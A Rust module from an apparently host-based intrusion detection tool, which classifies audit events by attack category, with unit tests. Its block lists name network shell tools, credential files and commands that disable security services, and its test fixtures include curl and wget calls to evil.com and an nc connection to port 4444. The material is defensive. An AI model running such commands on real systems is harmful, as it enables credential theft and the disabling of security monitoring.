use std::fmt;

use crate::alerts::Severity;
use crate::auditd::ParsedEvent;

/// Categories of suspicious behavior
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum BehaviorCategory {
    DataExfiltration,
    PrivilegeEscalation,
    SecurityTamper,
    Reconnaissance,
    SideChannel,
    SecureClawMatch,
}

impl fmt::Display for BehaviorCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            BehaviorCategory::DataExfiltration => write!(f, "DATA_EXFIL"),
            BehaviorCategory::PrivilegeEscalation => write!(f, "PRIV_ESC"),
            BehaviorCategory::SecurityTamper => write!(f, "SEC_TAMPER"),
            BehaviorCategory::Reconnaissance => write!(f, "RECON"),
            BehaviorCategory::SideChannel => write!(f, "SIDE_CHAN"),
            BehaviorCategory::SecureClawMatch => write!(f, "SC_MATCH"),
        }
    }
}

/// Sensitive files that should never be read by the watched user
const CRITICAL_READ_PATHS: &[&str] = &[
    "/etc/shadow",
    "/etc/sudoers",
    "/etc/gshadow",
    "/etc/master.passwd",
    "/proc/kcore",
];

/// Sensitive files that should never be written by the watched user
const CRITICAL_WRITE_PATHS: &[&str] = &[
    "/etc/passwd",
    "/etc/hosts",
    "/etc/crontab",
    "/etc/sudoers",
    "/etc/shadow",
];

/// Reconnaissance-indicative file paths
const RECON_PATHS: &[&str] = &[
    ".env",
    ".aws/credentials",
    ".aws/config",
    ".ssh/id_rsa",
    ".ssh/id_ed25519",
    ".ssh/config",
    ".ssh/known_hosts",
    ".gnupg/",
    ".kube/config",
    "/proc/kallsyms",
    "/sys/devices/system/cpu/vulnerabilities/",
];

/// Network exfiltration tools
const EXFIL_COMMANDS: &[&str] = &["curl", "wget", "nc", "ncat", "netcat", "socat"];

/// Security-disabling commands (matched as substrings of full command)
const SECURITY_TAMPER_PATTERNS: &[&str] = &[
    "ufw disable",
    "iptables -f",
    "iptables --flush",
    "iptables -F",
    "nft flush",
    "systemctl stop apparmor",
    "systemctl disable apparmor",
    "systemctl stop auditd",
    "systemctl disable auditd",
    "systemctl stop openclawav",
    "systemctl disable openclawav",
    "systemctl stop samhain",
    "systemctl disable samhain",
    "systemctl stop fail2ban",
    "systemctl disable fail2ban",
    "aa-teardown",
    "setenforce 0",
];

/// Recon commands
const RECON_COMMANDS: &[&str] = &["whoami", "id", "uname", "env", "printenv", "hostname", "ifconfig", "ip addr"];

/// Side-channel attack tools
const SIDECHANNEL_TOOLS: &[&str] = &["mastik", "flush-reload", "prime-probe", "sgx-step", "cache-attack"];

/// Classify a parsed audit event against known attack patterns.
/// Returns Some((category, severity)) if the event matches a rule, None otherwise.
pub fn classify_behavior(event: &ParsedEvent) -> Option<(BehaviorCategory, Severity)> {
    // Check EXECVE events with actual commands
    if let Some(ref cmd) = event.command {
        let cmd_lower = cmd.to_lowercase();
        let args = &event.args;
        let binary = args.first().map(|s| {
            // Extract basename from full path
            s.rsplit('/').next().unwrap_or(s)
        }).unwrap_or("");

        // --- CRITICAL: Security Tamper ---
        // Match against both original and lowercased (some flags are case-sensitive like -F)
        for pattern in SECURITY_TAMPER_PATTERNS {
            if cmd_lower.contains(pattern) || cmd.contains(pattern) {
                return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
            }
        }

        // --- CRITICAL: Data Exfiltration via network tools ---
        if EXFIL_COMMANDS.iter().any(|&c| binary.eq_ignore_ascii_case(c)) {
            return Some((BehaviorCategory::DataExfiltration, Severity::Critical));
        }

        // --- CRITICAL: Side-channel attack tools ---
        if SIDECHANNEL_TOOLS.iter().any(|&c| binary.eq_ignore_ascii_case(c)) {
            return Some((BehaviorCategory::SideChannel, Severity::Critical));
        }

        // --- CRITICAL: Reading sensitive files ---
        if ["cat", "less", "more", "head", "tail", "xxd", "base64", "cp", "scp"].contains(&binary) {
            for arg in args.iter().skip(1) {
                for path in CRITICAL_READ_PATHS {
                    if arg.contains(path) {
                        return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                    }
                }
            }
        }

        // --- CRITICAL: Writing to sensitive files ---
        if ["tee", "cp", "mv", "install"].contains(&binary) {
            for arg in args.iter().skip(1) {
                for path in CRITICAL_WRITE_PATHS {
                    if arg.contains(path) {
                        return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                    }
                }
            }
        }

        // --- CRITICAL: Editors on sensitive files ---
        if ["vi", "vim", "nano", "sed", "ed"].contains(&binary) {
            for arg in args.iter().skip(1) {
                for path in CRITICAL_WRITE_PATHS {
                    if arg.contains(path) {
                        return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                    }
                }
            }
        }

        // --- WARNING: Reconnaissance commands ---
        if RECON_COMMANDS.iter().any(|&c| {
            let c_base = c.split_whitespace().next().unwrap_or(c);
            binary.eq_ignore_ascii_case(c_base)
        }) {
            return Some((BehaviorCategory::Reconnaissance, Severity::Warning));
        }

        // --- WARNING: Reading recon-sensitive files ---
        if ["cat", "less", "more", "head", "tail", "cp"].contains(&binary) {
            for arg in args.iter().skip(1) {
                for path in RECON_PATHS {
                    if arg.contains(path) {
                        return Some((BehaviorCategory::Reconnaissance, Severity::Warning));
                    }
                }
            }
        }

        // --- CRITICAL: base64 encoding + suspicious piping ---
        if binary == "base64" {
            // base64 encoding of files is suspicious
            return Some((BehaviorCategory::DataExfiltration, Severity::Warning));
        }
    }

    // Check syscall-level events for file access to sensitive paths
    if let Some(ref path) = event.file_path {
        // openat/read on critical files
        if ["openat", "newfstatat", "statx"].contains(&event.syscall_name.as_str()) && event.success {
            for crit_path in CRITICAL_READ_PATHS {
                if path.contains(crit_path) {
                    return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                }
            }
            for recon_path in RECON_PATHS {
                if path.contains(recon_path) {
                    return Some((BehaviorCategory::Reconnaissance, Severity::Warning));
                }
            }
        }

        // unlinkat/renameat on critical files
        if ["unlinkat", "renameat"].contains(&event.syscall_name.as_str()) {
            for crit_path in CRITICAL_WRITE_PATHS {
                if path.contains(crit_path) {
                    return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                }
            }
        }
    }

    // perf_event_open can be used for cache timing attacks
    if event.syscall_name == "perf_event_open" {
        return Some((BehaviorCategory::SideChannel, Severity::Warning));
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_exec_event(args: &[&str]) -> ParsedEvent {
        ParsedEvent {
            syscall_name: "execve".to_string(),
            command: Some(args.join(" ")),
            args: args.iter().map(|s| s.to_string()).collect(),
            file_path: None,
            success: true,
            raw: String::new(),
        }
    }

    fn make_syscall_event(name: &str, path: &str) -> ParsedEvent {
        ParsedEvent {
            syscall_name: name.to_string(),
            command: None,
            args: vec![],
            file_path: Some(path.to_string()),
            success: true,
            raw: String::new(),
        }
    }

    // --- Data Exfiltration ---

    #[test]
    fn test_curl_is_exfil() {
        let event = make_exec_event(&["curl", "http://evil.com/exfil"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    #[test]
    fn test_wget_is_exfil() {
        let event = make_exec_event(&["wget", "http://evil.com/payload"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    #[test]
    fn test_nc_is_exfil() {
        let event = make_exec_event(&["nc", "10.0.0.1", "4444"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    #[test]
    fn test_full_path_curl_is_exfil() {
        let event = make_exec_event(&["/usr/bin/curl", "-s", "http://evil.com"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    // --- Privilege Escalation ---

    #[test]
    fn test_cat_etc_shadow() {
        let event = make_exec_event(&["cat", "/etc/shadow"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_cat_etc_sudoers() {
        let event = make_exec_event(&["cat", "/etc/sudoers"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_write_etc_passwd() {
        let event = make_exec_event(&["tee", "/etc/passwd"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_vim_etc_hosts() {
        let event = make_exec_event(&["vim", "/etc/hosts"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_openat_shadow_syscall() {
        let event = make_syscall_event("openat", "/etc/shadow");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_unlinkat_passwd() {
        let event = make_syscall_event("unlinkat", "/etc/passwd");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    // --- Security Tamper ---

    #[test]
    fn test_ufw_disable() {
        let event = make_exec_event(&["ufw", "disable"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_iptables_flush() {
        let event = make_exec_event(&["iptables", "-F"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_stop_auditd() {
        let event = make_exec_event(&["systemctl", "stop", "auditd"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_stop_apparmor() {
        let event = make_exec_event(&["systemctl", "disable", "apparmor"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    // --- Reconnaissance ---

    #[test]
    fn test_whoami_recon() {
        let event = make_exec_event(&["whoami"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_id_recon() {
        let event = make_exec_event(&["id"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_uname_recon() {
        let event = make_exec_event(&["uname", "-a"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_cat_env_file() {
        let event = make_exec_event(&["cat", "/home/user/.env"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_cat_aws_credentials() {
        let event = make_exec_event(&["cat", "/home/user/.aws/credentials"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_cat_ssh_key() {
        let event = make_exec_event(&["cat", "/home/user/.ssh/id_rsa"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_openat_env_file() {
        let event = make_syscall_event("openat", "/opt/app/.env");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    // --- Benign ---

    #[test]
    fn test_ls_is_benign() {
        let event = make_exec_event(&["ls", "-la", "/tmp"]);
        let result = classify_behavior(&event);
        assert_eq!(result, None);
    }

    #[test]
    fn test_cat_normal_file() {
        let event = make_exec_event(&["cat", "/tmp/notes.txt"]);
        let result = classify_behavior(&event);
        assert_eq!(result, None);
    }

    #[test]
    fn test_openat_normal_file() {
        let event = make_syscall_event("openat", "/tmp/something");
        let result = classify_behavior(&event);
        assert_eq!(result, None);
    }

    // --- Side-Channel Attack Detection ---

    #[test]
    fn test_sidechannel_tool_mastik() {
        let event = make_exec_event(&["mastik", "--attack-type", "flush-reload"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Critical)));
    }

    #[test]
    fn test_sidechannel_tool_flush_reload() {
        let event = make_exec_event(&["flush-reload", "/usr/lib/x86_64-linux-gnu/libcrypto.so.1.1"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Critical)));
    }

    #[test]
    fn test_sidechannel_tool_prime_probe() {
        let event = make_exec_event(&["prime-probe", "--target", "aes"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Critical)));
    }

    #[test]
    fn test_sidechannel_tool_sgx_step() {
        let event = make_exec_event(&["sgx-step", "--victim", "/opt/enclave.so"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Critical)));
    }

    #[test]
    fn test_sidechannel_tool_cache_attack() {
        let event = make_exec_event(&["cache-attack", "--L1d", "--target", "openssl"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Critical)));
    }

    #[test]
    fn test_perf_event_open_syscall() {
        let mut event = make_syscall_event("perf_event_open", "");
        event.file_path = None; // perf_event_open doesn't involve file paths
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Warning)));
    }

    #[test]
    fn test_access_proc_kcore() {
        let event = make_exec_event(&["cat", "/proc/kcore"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_access_proc_kallsyms() {
        let event = make_exec_event(&["cat", "/proc/kallsyms"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_access_cpu_vulnerabilities() {
        let event = make_exec_event(&["cat", "/sys/devices/system/cpu/vulnerabilities/spectre_v1"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_openat_proc_kcore_syscall() {
        let event = make_syscall_event("openat", "/proc/kcore");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_openat_proc_kallsyms_syscall() {
        let event = make_syscall_event("openat", "/proc/kallsyms");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_cachegrind_not_flagged_as_sidechannel() {
        // cachegrind is a legitimate profiling tool (valgrind --tool=cachegrind)
        // It's not in SIDECHANNEL_TOOLS, so it should not be flagged
        let event = make_exec_event(&["cachegrind", "--trace", "/tmp/program"]);
        let result = classify_behavior(&event);
        assert_eq!(result, None);
    }
}
